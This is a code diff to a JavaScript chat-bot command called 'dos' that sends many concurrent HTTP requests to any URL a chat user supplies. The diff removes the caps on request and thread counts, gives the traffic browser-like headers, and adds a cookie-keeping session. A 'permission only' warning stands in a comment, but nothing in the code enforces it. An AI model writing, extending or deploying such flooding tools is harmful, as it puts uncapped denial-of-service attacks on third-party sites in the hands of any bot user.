@@ -1,6 +1,6 @@
 /**
  * DOS Command - Stress test a URL with multiple requests
- * EXACTLY matching the Python script behavior
+ * EXACTLY matching the Python script behavior with session persistence
  * WARNING: Only use on your own servers or with permission!
  */
 
@@ -14,6 +14,22 @@ const FORCE_AI_MODE = true;
 
 // Store active test sessions
 const activeTests = new Map();
+
+// Create a session instance that persists cookies (like Python's requests.get)
+const createSession = () => {
+    const session = axios.create({
+        timeout: 2000,
+        validateStatus: () => true,
+        headers: {
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+            'Accept-Language': 'en-US,en;q=0.5',
+            'Accept-Encoding': 'gzip, deflate',
+            'Connection': 'keep-alive'
+        }
+    });
+    return session;
+};
 
 module.exports = {
     name: 'dos',
@@ -55,20 +71,16 @@ module.exports = {
         }
         
         let url = args[0];
-        let totalRequests = 100;  // Default matches Python script
-        let threads = 5;          // Default matches Python script
+        let totalRequests = 100;   // Using your test values
+        let threads = 5;           // Using your test values
         
         // Parse parameters
         if (args[1] && !isNaN(parseInt(args[1]))) {
             totalRequests = parseInt(args[1]);
-            if (totalRequests < 10) totalRequests = 10;
-            if (totalRequests > 50000) totalRequests = 50000;
         }
         
         if (args[2] && !isNaN(parseInt(args[2]))) {
             threads = parseInt(args[2]);
-            if (threads < 1) threads = 1;
-            if (threads > 1000) threads = 1000;
         }
         
         // Validate URL
@@ -181,6 +193,9 @@ async function startStressTest(sock, chatId, sender, reply, react, targetUrl, to
     let isStopped = false;
     let completedRequests = 0;
     
+    // Create a shared session for this test (cookies persist across requests like Python)
+    const sharedSession = createSession();
+    
     // Store test info for stopping
     activeTests.set(sender, {
         stop: false,
@@ -188,7 +203,7 @@ async function startStressTest(sock, chatId, sender, reply, react, targetUrl, to
         totalRequests: totalRequests
     });
     
-    console.log(`[DOS] Starting stress test on: ${targetUrl}`);
+    console.log(`[DOS] Starting Stress Test on: ${targetUrl}`);
     console.log(`[DOS] Config: ${totalRequests} requests across ${threads} threads.`);
     
     const statusMsg = await reply(`⚠️ *STRESS TEST STARTED*\n\n` +
@@ -212,11 +227,8 @@ async function startStressTest(sock, chatId, sender, reply, react, targetUrl, to
             }
             
             try {
-                // EXACT same as Python: requests.get(TARGET_URL, timeout=2)
-                const response = await axios.get(targetUrl, {
-                    timeout: 2000,  // 2 seconds timeout (matches Python)
-                    validateStatus: () => true  // Don't throw on any status
-                });
+                // Use the shared session to maintain cookies (like Python's requests.get)
+                const response = await sharedSession.get(targetUrl);
                 successCount++;
             } catch (error) {
                 failureCount++;
@@ -224,8 +236,8 @@ async function startStressTest(sock, chatId, sender, reply, react, targetUrl, to
             
             completedRequests++;
             
-            // Update progress (every 50 requests or at completion)
-            if (completedRequests % 50 === 0 || completedRequests === totalRequests) {
+            // Update progress (every 10 requests or at completion)
+            if (completedRequests % 10 === 0 || completedRequests === totalRequests) {
                 const percent = ((completedRequests / totalRequests) * 100).toFixed(1);
                 try {
                     await sock.sendMessage(chatId, {
